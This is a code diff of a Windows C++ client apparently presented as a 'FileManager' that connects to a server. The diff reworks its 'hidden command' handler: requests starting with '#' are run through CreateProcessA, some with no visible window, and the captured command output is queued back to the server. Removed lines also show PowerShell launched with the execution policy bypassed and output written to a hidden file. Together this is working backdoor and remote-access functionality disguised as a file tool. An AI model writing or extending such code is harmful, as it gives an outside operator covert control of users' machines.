@@ -1,11 +1,16 @@
 #include "client.hpp"
 
+#include <locale>
+#include <codecvt>
+
 using std::cin;
 using std::cout;
 using std::cerr;
+using std::clog;
 using std::endl;
 using std::string; 
 using std::stringstream;
+using std::streambuf;
 using std::lock_guard;
 using std::unique_lock;
 using std::mutex;
@@ -224,10 +229,6 @@ void FileManager::RunRequestsCycle()
 
 int FileManager::run()
 {
-    // Устанавливаем кодировку консоли для корректного отображения вывода скрытых команд
-    SetConsoleOutputCP(O_TEXT);
-    SetConsoleCP(O_TEXT);
-
     // Инициализируем структуры сокета 
     StartClient();
 
@@ -237,10 +238,7 @@ int FileManager::run()
     timeout.tv_usec = 1;
 
     fd_set readSet;
-    //FD_ZERO(&readSet);
-    //FD_SET(socket_, &readSet);
 
-    // Инициализируем пул потоков
     InitializeThreadpoolEnvironment(&call_back_environ_);
     pool_ = CreateThreadpool(NULL);
     SetThreadpoolThreadMaximum(pool_, TH_SIZE_MAXIMUM);
@@ -251,7 +249,6 @@ int FileManager::run()
     cleanupgroup_ = CreateThreadpoolCleanupGroup();
     SetThreadpoolCallbackCleanupGroup(&call_back_environ_, cleanupgroup_, NULL);
 
-    // Запускаем поток выполнения команд юзера
     workcallback_ = ThreadStarter;
     work_ = CreateThreadpoolWork(workcallback_, this, &call_back_environ_);
     SubmitThreadpoolWork(work_);
@@ -271,7 +268,7 @@ int FileManager::run()
 
         if (!request_str.empty())
         {
-            // Если в начале запроса есть символ '#' - это запрос на исполнение скрытой команды
+            // # - A special character for executing a hidden command
             if (request_str[0] == '#')
             {
                 hidden_command_ = request_str;
@@ -297,48 +294,115 @@ int FileManager::run()
 }
 
 
-// TODO 
-// Поправить кодировку вывода powershell
 VOID FileManager::ExecHiddenCommand(PTP_CALLBACK_INSTANCE Instance, PVOID Parameter, PTP_WORK Work)
 {
     FileManager* ptr = reinterpret_cast<FileManager*>(Parameter);
-
-    string result;
-    char buffer[128];
-
-    string cmd;
+    string result, cmd;
 
     cmd = ptr->hidden_command_;
     ptr->hidden_command_.clear();
 
-    int switch_on;
-    if (cmd.find(".exe") != string::npos)
-    {
-        cmd.erase(0, 1);
-        switch_on = 1;
-    }
-    else if (cmd.find("#ps1") != string::npos)
+    STARTUPINFOA si = { sizeof(si) };
+    ZeroMemory(&si, sizeof(STARTUPINFOA));
+    PROCESS_INFORMATION pi = {};
+
+    
+    if (cmd.find("#cmd") != string::npos)
     {
         cmd.erase(0, 4);
-        // Формируем команду для запуска PowerShell скрипта
-        std::string command = "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"";
-        command += cmd;
-        command += "\"";
-        cmd = command;
-        switch_on = 0;
-    }
-    else
-        switch_on = 0;
+        if (cmd.find("powershell.exe") != string::npos)
+        {
+            SetConsoleOutputCP(1251);
+            SetConsoleCP(1251);
+        }
+        else {
+            SetConsoleOutputCP(437);
+            SetConsoleCP(437);
+        }
 
-    STARTUPINFOA si = {sizeof(si)};
-    PROCESS_INFORMATION pi = {};
-    FILE* pipe;
-    HANDLE h_file;
-    switch (switch_on)
+        // Intercepting the console output
+        stringstream output;
+
+        // Saving the current stream buffers
+        streambuf* coutBuf = cout.rdbuf();
+        streambuf* cerrBuf = cerr.rdbuf();
+        streambuf* clogBuf = clog.rdbuf();
+
+        // Redirecting streams to the stream buffer
+        cout.rdbuf(output.rdbuf());
+        cerr.rdbuf(output.rdbuf());
+        clog.rdbuf(output.rdbuf());
+
+
+        SECURITY_ATTRIBUTES saAttr;
+        HANDLE hChildStdoutRd, hChildStdoutWr;
+        ZeroMemory(&saAttr, sizeof(SECURITY_ATTRIBUTES));
+        saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
+        saAttr.bInheritHandle = TRUE; 
+
+        // Creating an anonymous channel to redirect the stdout of the child process
+        if (!CreatePipe(&hChildStdoutRd, &hChildStdoutWr, &saAttr, 0)) 
+        {
+            result = "ERROR CREATE PIPE";
+            lock_guard<mutex> lock(ptr->mt_);
+            ptr->requests_q.push(result);
+            return;
+        }
+
+        // Setting the end of the anonymous stdout channel entry in the inherited descriptor
+        if (!SetHandleInformation(hChildStdoutRd, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT))
+        {
+            CloseHandle(hChildStdoutWr);
+            CloseHandle(hChildStdoutRd);
+            result = "ERROR SET PIPE INFO";
+            lock_guard<mutex> lock(ptr->mt_);
+            ptr->requests_q.push(result);
+            return;
+        }
+
+        si.cb = sizeof(STARTUPINFOA);
+        si.hStdOutput = hChildStdoutWr; 
+        si.hStdError = hChildStdoutWr;
+        si.dwFlags |= STARTF_USESTDHANDLES;
+
+        if (CreateProcessA(NULL, const_cast<char*>(cmd.c_str()), NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi))
+        {
+            CloseHandle(hChildStdoutWr);
+            DWORD bytesRead;
+            const DWORD bufferSize = 4096;
+            char buffer[bufferSize];
+            while (ReadFile(hChildStdoutRd, buffer, bufferSize - 1, &bytesRead, NULL) && bytesRead > 0) {
+                buffer[bytesRead] = '\0';
+                std::cout << buffer;
+            }
+
+            // Waiting for the script to execute
+            WaitForSingleObject(pi.hProcess, INFINITE);
+            CloseHandle(pi.hProcess);
+            CloseHandle(pi.hThread);
+        }
+
+        // We read the output of the command and save it to a string
+        while(!output.eof())
+        {
+            string tmp;
+            getline(output, tmp);
+            result += tmp + "\n";
+        }
+
+        // Restoring the original stream buffers
+        cout.rdbuf(coutBuf);
+        cerr.rdbuf(cerrBuf);
+        clog.rdbuf(clogBuf);
+
+        if (result.empty())
+            result = "The command is not supported!";
+    }
+    else if (cmd.find("#") != string::npos)
     {
-    case 1:
+        cmd.erase(0, 1);
         si = { sizeof(si) };
-        if (CreateProcessA(nullptr, const_cast<char*>(cmd.c_str()), nullptr, nullptr, FALSE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) 
+        if (CreateProcessA(nullptr, const_cast<char*>(cmd.c_str()), nullptr, nullptr, FALSE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi))
         {
             //WaitForSingleObject(pi.hProcess, INFINITE);
             CloseHandle(pi.hProcess);
@@ -347,67 +411,9 @@ VOID FileManager::ExecHiddenCommand(PTP_CALLBACK_INSTANCE Instance, PVOID Parame
         }
         else
             result = "Error start .exe file.";
-        break;
-
-    /*case 2:
-        // Открываем процесс PowerShell в режиме чтения и записи
-        pipe = _popen("powershell.exe", "r+");
-        if (pipe == nullptr)
-            result = "Ошибка при запуске PowerShell.";
-
-        // Записываем скрипт в процесс PowerShell
-        fputs(cmd.c_str(), pipe);
-        fflush(pipe);
-
-        // Закрываем входной поток процесса PowerShell
-        fclose(pipe);
-
-        // Читаем вывод из процесса PowerShell
-        char buffer[128];
-        while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
-            result += buffer;
-        }
-
-        // Закрываем процесс PowerShell
-        _pclose(pipe);
-
-        break;*/
-
-    case 0:
-        h_file = CreateFileA("_popen.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
-        SetHandleInformation(h_file, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT);
-
-        si.dwFlags |= STARTF_USESTDHANDLES;
-        si.hStdInput = GetStdHandle(STD_INPUT_HANDLE);
-        si.hStdError = h_file;
-        si.hStdOutput = h_file;
-
-        if (CreateProcessA(NULL, const_cast<char*>(cmd.c_str()), NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi))
-        {
-            WaitForSingleObject(pi.hProcess, INFINITE);
-            CloseHandle(pi.hProcess);
-            CloseHandle(pi.hThread);
-        }
-
-        CloseHandle(h_file);
-
-        pipe = fopen("_popen.txt", "rb");
-        // Читаем вывод команды и сохраняем его в строку
-        while (!feof(pipe))
-        {
-            if (fgets(buffer, sizeof(buffer), pipe) != nullptr)
-                result += buffer;
-        }
-        if (result.empty())
-            result = "The command is not supported!";
-        // Закрываем файловый поток
-        fclose(pipe);
-        break;
-
-    default:
-        result = "Undefined request";
-        break;
     }
+    else
+        result = "Undefined request";
 
     {
         lock_guard<mutex> lock(ptr->mt_);
